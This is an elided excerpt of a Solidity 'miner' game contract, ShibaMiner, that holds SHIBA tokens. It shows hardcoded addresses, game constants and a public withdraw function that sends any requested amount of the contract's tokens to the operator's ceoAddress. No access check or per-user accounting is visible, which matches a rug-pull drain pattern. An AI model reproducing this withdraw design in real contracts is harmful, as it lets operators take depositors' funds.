...
contract ShibaMiner {
    ...
    address shiba = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D; 
    uint256 public EGGS_TO_HATCH_1MINERS=3200000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    ...
    constructor() public{
        ...
        ceoAddress2=address(0x1B128AA86358f107803e021208565939cE76F660);
    }
    ...
    function withdraw(uint256 _amount) public {
        ...
        ERC20(shiba).transfer(address(ceoAddress), _amount);
    }
}
